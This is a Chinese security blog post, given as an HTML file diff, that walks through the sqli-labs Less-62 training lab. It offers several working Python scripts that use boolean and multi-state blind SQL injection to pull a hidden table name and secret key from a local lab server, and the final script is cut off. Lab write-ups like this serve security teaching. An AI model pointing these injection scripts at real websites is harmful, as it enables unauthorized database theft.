@@ -1,0 +1,528 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;dark&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/shinchan.png">
+  <link rel="icon" href="/img/shinchan.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="Ovie博客,Ovi3博客">
+  <meta name="author" content="Ovie">
+  <meta name="keywords" content="Ovie博客,Ovi3博客,个人博客,技术分享,网络安全,安全研发,安全研究,渗透测试">
+  <meta name="google-site-verification" content="eW4bY2KPHT_B6-DOYCuxmzwdjlQ34WXHQ4X3G__8cKY" />
+  
+  <title>sqli-labs靶场Less-62题解（少于130次） - Ovie博客</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/vs2015.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"ovi3.github.io","root":"/","version":"1.8.11","typing":{"enable":false,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="Ovie博客" type="application/atom+xml">
+<link rel="alternate" href="/rss2.xml" title="Ovie博客" type="application/rss+xml">
+</head>
+
+
+<body>
+  <header style="height: 60vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Ovie</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/atom.xml">
+                <i class="iconfont icon-rss-fill"></i>
+                 
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('https://api.boxmoe.com/random.php?3') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="sqli-labs靶场Less-62题解（少于130次）">
+              
+                sqli-labs靶场Less-62题解（少于130次）
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-12-04 13:00" pubdate>
+        2020年12月4日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.3k 字
+    </span>
+  
+
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">sqli-labs靶场Less-62题解（少于130次）</h1>
+            
+            <div class="markdown-body">
+              <p><a target="_blank" rel="noopener" href="https://github.com/Audi-1/sqli-labs">sqli-labs</a>靶场Less-62题目，是通过布尔注入获取一段secret key，该key存于<code>challenges</code>数据库的某个随机表名的表内。要求在请求次数不超过130次的情况下获取该key。</p>
+<h2 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h2><p>直接用docker搭建：<code>sudo docker run -dt --name sqli-lab -p 80:80 acgpiano/sqli-labs:latest</code></p>
+<h2 id="二分法"><a href="#二分法" class="headerlink" title="二分法"></a>二分法</h2><p>该注入点是<code>id</code>参数，SQL语句上下文是<code>SELECT * FROM security.users WHERE id=(&#39;$id&#39;) LIMIT 0,1</code>，注入时用<code>&#39;)</code>闭合。一般思路是先获取存key的表的表名，再获取key所在的列的列名，再获取key。表名有10个字符，由大写字母和数字构成；列名为<code>secret_4个字符</code>，这4个字符由大写字母和数字构成；secret key为24个字符，由大小写字母和数字构成。</p>
+<p>下面的脚本采用二分法比较ASCII码来获取数据，请求次数在210次左右。而题目要求是130次内，不过请求不带Cookie可绕过了这个限制。</p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-comment"># -*-coding:utf-8-*-</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">表名：10个字符。有大写字母和数字构成</span><br><span class="hljs-string">列名：secret_接4个字符，这4个字符由大写字母和数字构成</span><br><span class="hljs-string">secret：24个字符，由大小写字母和数字构成</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>un_chars = string.digits + string.ascii_uppercase  <span class="hljs-comment"># 按ASCII码从小到大排序</span><br>uln_chars = string.digits + string.ascii_uppercase + string.ascii_lowercase  <span class="hljs-comment"># 按ASCII码从小到大排序</span><br>url = <span class="hljs-string">&quot;http://192.168.197.133/Less-62/index.php&quot;</span>  <span class="hljs-comment"># 改成你的地址</span><br>try_count = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_data</span>(<span class="hljs-params">tmpl_payload, length, chars</span>):<br>    <span class="hljs-keyword">global</span> try_count<br>    result = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, length + <span class="hljs-number">1</span>):<br>        left, right = <span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(chars) - <span class="hljs-number">1</span><br>        <span class="hljs-keyword">while</span> left &lt; right:<br>            m = (left + right) // <span class="hljs-number">2</span>  <span class="hljs-comment"># 左中位数</span><br>            payload = tmpl_payload % (i, <span class="hljs-built_in">ord</span>(chars[m]))<br>            resp = requests.get(url, params=&#123;<span class="hljs-string">&quot;id&quot;</span>: payload&#125;)<br>            try_count += <span class="hljs-number">1</span>  <span class="hljs-comment"># 统计请求个数</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Your Login name&quot;</span> <span class="hljs-keyword">in</span> resp.text:<br>                left = m + <span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                right = m<br>        result += chars[left]<br><br>    <span class="hljs-keyword">return</span> result<br><br><br>table_name = extract_data(<br>    <span class="hljs-string">&quot;1&#x27;) and ascii(substr((select table_name from information_schema.TABLES where TABLE_SCHEMA=&#x27;challenges&#x27;),%s,1))&gt;%d#&quot;</span>,<br>    <span class="hljs-number">10</span>, un_chars<br>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;table_name:&quot;</span>, table_name)<br><br>column_name = <span class="hljs-string">&quot;secret_&quot;</span> + extract_data(<br>    <span class="hljs-string">&quot;1&#x27;) and ascii(substr(substr((select column_name from information_schema.columns where TABLE_name=&#x27;&quot;</span> + table_name + <span class="hljs-string">&quot;&#x27; limit 2,1),8,4),%s,1))&gt;%d#&quot;</span>,<br>    <span class="hljs-number">4</span>, un_chars<br>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;column_name:&quot;</span>, column_name)<br><br>secret_key = extract_data(<br>    <span class="hljs-string">&quot;1&#x27;) and ascii(substr((select &quot;</span> + column_name + <span class="hljs-string">&quot; from &quot;</span> + table_name+<span class="hljs-string">&quot;),%s,1))&gt;%d#&quot;</span>,<br>    <span class="hljs-number">24</span>, uln_chars<br>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;secret_key:&quot;</span>, secret_key)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Done. try_count:&quot;</span>, try_count)<br><br></code></pre></div></td></tr></table></figure>
+
+
+
+<h2 id="利用多状态"><a href="#利用多状态" class="headerlink" title="利用多状态"></a>利用多状态</h2><p>虽说上面可以绕过尝试次数限制，那如果就要尝试次数在130次内呢。</p>
+<p>上面的二分法通过判断响应里是否有查询结果来判断注入的SQL语句为True或False，响应里有两种状态：有查询结果和无查询结果。其实响应里存在多个状态，id为1时返回的<code>Login name</code>为<code>Angelina</code>，为<code>2</code>时返回的是<code>Dummy</code>，还有为3，为4，为5等。假如我们要判断数据库里一个字符中的N个比特是什么，我们需要2的N次方个状态，如：我们要判断某串字符串第<code>i</code>个字符的第<code>j</code>位开始的三个比特是否为：000，001，010，011，100，101，110或111，写成SQL语句就是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">SELECT CASE ASCII(SUBSTRING((&#123;query&#125;), &#123;i&#125;, 1)) &amp; (2**j + 2**(j+1) + 2**(j+2))<br>    WHEN 0 THEN 1<br>    WHEN 2**j THEN 2<br>    WHEN 2**(j+1) THEN 3<br>    WHEN 2**(j+1) + 2**j THEN 4<br>    WHEN 2**(j+2) THEN 5<br>    WHEN 2**(j+2) + 2**j THEN 6<br>    WHEN 2**(j+2) + 2**(j+1) THEN 7<br>    ELSE 8<br>END<br></code></pre></div></td></tr></table></figure>
+<p>因为users表里的数据有13条，也就是13个状态，大于8，小于16，所以每次请求通过比较8个状态获取3个比特的数据。</p>
+<blockquote>
+<p>一个小问题：为什么id为1时，返回的name是<code>Angelina</code>？而数据库里id为1的name是<code>Dumb</code>？</p>
+<p>因为响应中返回的name是从硬编码在PHP代码里的数组里通过下标获取的，看代码：<a target="_blank" rel="noopener" href="https://github.com/Audi-1/sqli-labs/blob/886b0dcc733c1a36caf10cfba076397b9e09ce7f/Less-62/index.php#L104">https://github.com/Audi-1/sqli-labs/blob/886b0dcc733c1a36caf10cfba076397b9e09ce7f/Less-62/index.php#L104</a></p>
+</blockquote>
+<p>通过上面的思路，编写脚本如下。请求次数减少到114次。</p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-comment"># -*-coding:utf-8-*-</span><br><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> requests<br><br><br>url = <span class="hljs-string">&quot;http://192.168.197.133/Less-62/index.php&quot;</span>  <span class="hljs-comment"># 改成你的地址</span><br>try_count = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_bits</span>(<span class="hljs-params">query, i, j</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    获取query执行结果的第 i 个（从1开始算）字符的第 j 位开始的 3 个比特</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">global</span> try_count<br><br>    payload = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    &#x27;+(</span><br><span class="hljs-string">SELECT CASE ASCII(SUBSTRING((&#123;query&#125;), &#123;i&#125;, 1)) &amp; (&#123;bit_mark&#125;)</span><br><span class="hljs-string">    WHEN &#123;0&#125; THEN 1</span><br><span class="hljs-string">    WHEN &#123;1&#125; THEN 2</span><br><span class="hljs-string">    WHEN &#123;2&#125; THEN 3</span><br><span class="hljs-string">    WHEN &#123;3&#125; THEN 4</span><br><span class="hljs-string">    WHEN &#123;4&#125; THEN 5</span><br><span class="hljs-string">    WHEN &#123;5&#125; THEN 6</span><br><span class="hljs-string">    WHEN &#123;6&#125; THEN 7</span><br><span class="hljs-string">    ELSE 8</span><br><span class="hljs-string">END</span><br><span class="hljs-string">)+&#x27;</span><br><span class="hljs-string">    &quot;&quot;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">0</span>, <span class="hljs-number">2</span>**j, <span class="hljs-number">2</span>**(j+<span class="hljs-number">1</span>), <span class="hljs-number">2</span>**(j+<span class="hljs-number">1</span>) + <span class="hljs-number">2</span>**j, <span class="hljs-number">2</span>**(j+<span class="hljs-number">2</span>), <span class="hljs-number">2</span>**(j+<span class="hljs-number">2</span>) + <span class="hljs-number">2</span>**j, <span class="hljs-number">2</span>**(j+<span class="hljs-number">2</span>) + <span class="hljs-number">2</span>**(j+<span class="hljs-number">1</span>), query=query, bit_mark=<span class="hljs-number">2</span>**j + <span class="hljs-number">2</span>**(j+<span class="hljs-number">1</span>) + <span class="hljs-number">2</span>**(j+<span class="hljs-number">2</span>), i=i)<br>    payload = re.sub(<span class="hljs-string">r&#x27;\s+&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>, payload.strip().replace(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&quot; &quot;</span>))<br>    <span class="hljs-comment"># print(payload)</span><br><br>    resp = requests.get(url, params=&#123;<span class="hljs-string">&quot;id&quot;</span>: payload&#125;)<br>    try_count += <span class="hljs-number">1</span><br><br>    info = &#123;<br>        <span class="hljs-string">&quot;Angelina&quot;</span>: <span class="hljs-string">&quot;000&quot;</span>,<br>        <span class="hljs-string">&quot;Dummy&quot;</span>: <span class="hljs-string">&quot;001&quot;</span>,<br>        <span class="hljs-string">&quot;secure&quot;</span>: <span class="hljs-string">&quot;010&quot;</span>,<br>        <span class="hljs-string">&quot;stupid&quot;</span>: <span class="hljs-string">&quot;011&quot;</span>,<br>        <span class="hljs-string">&quot;superman&quot;</span>: <span class="hljs-string">&quot;100&quot;</span>,<br>        <span class="hljs-string">&quot;batman&quot;</span>: <span class="hljs-string">&quot;101&quot;</span>,<br>        <span class="hljs-string">&quot;admin&quot;</span>: <span class="hljs-string">&quot;110&quot;</span>,<br>        <span class="hljs-string">&quot;admin1&quot;</span>: <span class="hljs-string">&quot;111&quot;</span><br>    &#125;<br><br>    <span class="hljs-keyword">match</span> = re.search(<span class="hljs-string">r&quot;Your Login name : (.*?)&lt;br&gt;&quot;</span>, resp.text)<br>    <span class="hljs-keyword">assert</span> <span class="hljs-keyword">match</span><br>    bits = info.get(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>))<br>    <span class="hljs-keyword">assert</span> bits<br>    <span class="hljs-keyword">return</span> bits<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_data</span>(<span class="hljs-params">query, length</span>):<br>    res = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, length+<span class="hljs-number">1</span>):<br>        b3 = extract_bits(query, i, <span class="hljs-number">0</span>)  <span class="hljs-comment"># 00000111</span><br>        b2 = extract_bits(query, i, <span class="hljs-number">3</span>)  <span class="hljs-comment"># 00111000</span><br>        b1 = extract_bits(query, i, <span class="hljs-number">5</span>)  <span class="hljs-comment"># 11100000</span><br>        bit = b1[:<span class="hljs-number">2</span>] + b2 + b3<br>        res += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(bit, <span class="hljs-number">2</span>))<br>    <span class="hljs-keyword">return</span> res<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    table_name = extract_data(<span class="hljs-string">&quot;select table_name from information_schema.TABLES where TABLE_SCHEMA=&#x27;challenges&#x27; limit 1&quot;</span>, <span class="hljs-number">10</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;table_name:&quot;</span>, table_name)<br><br>    column_name = <span class="hljs-string">&quot;secret_&quot;</span> + extract_data(<br>        <span class="hljs-string">&quot;substr((select column_name from information_schema.columns where TABLE_name=&#x27;&quot;</span> + table_name + <span class="hljs-string">&quot;&#x27; limit 2,1),8,4)&quot;</span>,<br>        <span class="hljs-number">4</span><br>    )<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;column_name:&quot;</span>, column_name)<br><br>    secret_key = extract_data(<span class="hljs-string">&quot;select &quot;</span> + column_name + <span class="hljs-string">&quot; from challenges.&quot;</span> + table_name, <span class="hljs-number">24</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;secret_key:&quot;</span>, secret_key)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Done. try_count:&quot;</span>, try_count)<br><br></code></pre></div></td></tr></table></figure>
+
+
+
+<h2 id="再减少点次数"><a href="#再减少点次数" class="headerlink" title="再减少点次数"></a>再减少点次数</h2><p>上面通过获取表名，再列名，再key。其实也可以不获取列名，只要知道表里有多少列，key所在的列在第几列即可，少点尝试次数。将上面main块的代码改成：</p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    table_name = extract_data(<span class="hljs-string">&quot;select table_name from information_schema.TABLES where TABLE_SCHEMA=&#x27;challenges&#x27; limit 1&quot;</span>, <span class="hljs-number">10</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;table_name:&quot;</span>, table_name)<br><br>    secret_key = extract_data(<span class="hljs-string">&quot;select c from (select 1 as a, 2 as b, 3 as c, 4 as d union select * from challenges.%s limit 1,1)x&quot;</span> % table_name, <span class="hljs-number">24</span>)   <span class="hljs-comment"># 主要改的是这一句</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;secret_key:&quot;</span>, secret_key)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Done. try_count:&quot;</span>, try_count)<br></code></pre></div></td></tr></table></figure>
+
+<p>请求次数是102次。</p>
+<h2 id="再减少些次数"><a href="#再减少些次数" class="headerlink" title="再减少些次数"></a>再减少些次数</h2><p>一般MySQL的表名是区分大小写的，而在字符串比较的时候是不区分大小写的。进到docker容器里（<code>sudo docker exec -it sqli-lab mysql</code>）执行下面SQL语句测试下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">use security<br><br>SELECT * FROM users;  # 返回了数据<br>SELECT * FROM userS;  # 报错，表名不存在<br>SELECT * FROM users WHERE username=&#x27;admin&#x27;;  # 返回admin<br>SELECT * FROM users WHERE username=&#x27;ADMIn&#x27;;  # 还是可以返回admin<br></code></pre></div></td></tr></table></figure>
+
+<p>再看sqli-labs比较key是否正确的SQL语句（代码<a target="_blank" rel="noopener" href="https://github.com/Audi-1/sqli-labs/blob/886b0dcc733c1a36caf10cfba076397b9e09ce7f/Less-62/index.php#L152">在这</a>）：</p>
+<figure class="highlight lasso"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs lasso"><span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span> FROM $table <span class="hljs-keyword">WHERE</span> $col1= <span class="hljs-string">&#x27;$key&#x27;</span>;<br></code></pre></div></td></tr></table></figure>
+
+<p>所以在获取key时，可以不管字母的大小写。而对于表名，它的构成是大写字母和数字，也用不着理会它的大小写。</p>
+<p>再看数字、大写字母、小写字母的ASCII码的二进制格式：</p>
+<figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs">数字： 0011xxxx<br>大写： 010xxxxx<br>小写： 011xxxxx<br></code></pre></div></td></tr></table></figure>
+
+<p>在获取表名或key时，我们判断第7位（比特）是不是1就知道该字符是数字或字母；而第6位不用管，因为对于数字，该位为1，对于字母，我们不用管字母的大小写也就不用管该位是0还是1。所以对于每个字符，我们只需获取第7位和前5位即可。</p>
+<p>编写脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-comment"># -*-coding:utf-8-*-</span><br><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> requests<br><br><br>url = <span class="hljs-string">&quot;http://192.168.197.133/Less-62/index.php&quot;</span>  <span class="hljs-comment"># 改成你的地址</span><br>try_count = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_bits</span>(<span class="hljs-params">query, i, bit_values: <span class="hljs-built_in">list</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    获取query执行结果的第 i 个（从1开始算）字符的3个比特</span><br><span class="hljs-string">    哪3个比特由bit_values指定</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">global</span> try_count<br><br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(bit_values) == <span class="hljs-number">8</span><br>    bit_marks = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> bit_values:<br>        bit_marks |= v<br><br><br>    payload = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    &#x27;+(</span><br><span 